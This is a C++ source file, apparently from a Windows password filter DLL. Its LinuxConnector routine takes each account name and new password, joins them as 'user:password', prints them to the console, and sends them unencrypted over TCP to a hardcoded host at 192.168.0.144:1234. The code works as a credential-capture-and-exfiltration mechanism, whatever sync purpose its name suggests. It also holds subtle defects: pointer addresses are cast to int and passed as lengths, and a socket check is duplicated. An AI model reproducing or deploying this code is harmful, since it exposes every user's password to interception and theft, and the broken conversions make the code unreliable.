
#include "LinuxConnector.h"
#include <iostream>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#pragma comment(lib, "Ws2_32.lib")

unsigned __stdcall LinuxConnector(void* params) {
	printf("connector called\n");
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount*>(params);

	/* ------------- init winsock ---------------*/
	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}
	/* ----------------- ------------------ */
	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	/* ------------ TODO: Fix: Get host/port from disk file ------------- */
	// Resolve the server address and port
	//iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
	iResult = getaddrinfo("192.168.0.144", "1234", &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	/* ----------------- --------------------- */
	SOCKET sock = INVALID_SOCKET;
	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;
	printf("connection attempt to socket\n");
	// Create a SOCKET for connecting to server
	sock = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (sock == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		fflush(stdout);
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	if (sock == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		fflush(stdout);
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	if (connect(sock, ptr->ai_addr, ptr->ai_addrlen)) {
		printf("connect failed\n");
		fflush(stdout);
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}
	/* ----------- Now should have a ConnectSocket established ------------- */
//#define DEFAULT_BUFLEN 512
	//int recvbuflen = DEFAULT_BUFLEN;
	printf("socket connection established: %u\n", sock);

	//const char* sendbuf = "this is a test";
	char* user = getUser(params);
	char* pass = getPwd(params);
	int sz = strlen(user) + strlen(pass);
	char* buf = new char[sz + 3];
	printf("user %s password %s\n", user, pass);

	sprintf_s(buf, sz + 2, "%s:%s", user, pass);

	// here we do the LongCharToMultiByte() to mutate account name and password into char string

	//  SEND BUFFER/CONTENT HERE !!!
	printf("socket: %u\n", sock);
	printf("Sending: %s\n", buf);
	fflush(stdout);

	iResult = send(sock, buf, (int)strlen(buf), 0);
	delete[] buf;
	// check result of send
	if (iResult == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		fflush(stdout);
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	printf("Bytes Sent: %ld\n", iResult);

	// shutdown the connection for sending since no more data will be sent
	// the client can still use the ConnectSocket for receiving data
	iResult = shutdown(sock, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed: %d\n", WSAGetLastError());
		fflush(stdout);
		closesocket(sock);
		WSACleanup();
		return 1;
	}
	return 0;
}

char* getUser(void* params) {
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount*>(params);
	char* cUser;
	LPCWCH User = pf->AccountName->Buffer;
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, User, (int)(pf->AccountName->Length), NULL, 0, NULL, NULL);
	cUser = new char[size_needed+1];
	WideCharToMultiByte(CP_UTF8, 0, &pf->AccountName->Buffer[0], (int)&pf->AccountName->Length, &cUser[0], size_needed, NULL, NULL);
	cUser[size_needed] = NULL;
	return cUser;
}

char* getPwd(void* params) {
	PasswordFilterAccount* pf = static_cast<PasswordFilterAccount*>(params);
	char* cPassword;
	LPCWCH Password = pf->Password->Buffer;
	//int size_needed = WideCharToMultiByte(CP_UTF8, 0, Password, (int)(pf->Password->Length), NULL, 0, NULL, NULL);
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &pf->Password->Buffer[0], (int)pf->Password->Length, NULL, 0, NULL, NULL);

	cPassword = new char[size_needed+1];
	WideCharToMultiByte(CP_UTF8, 0, &Password[0], (int)&pf->Password->Length, &cPassword[0], size_needed, NULL, NULL);
	cPassword[size_needed] = NULL;
	return cPassword;
}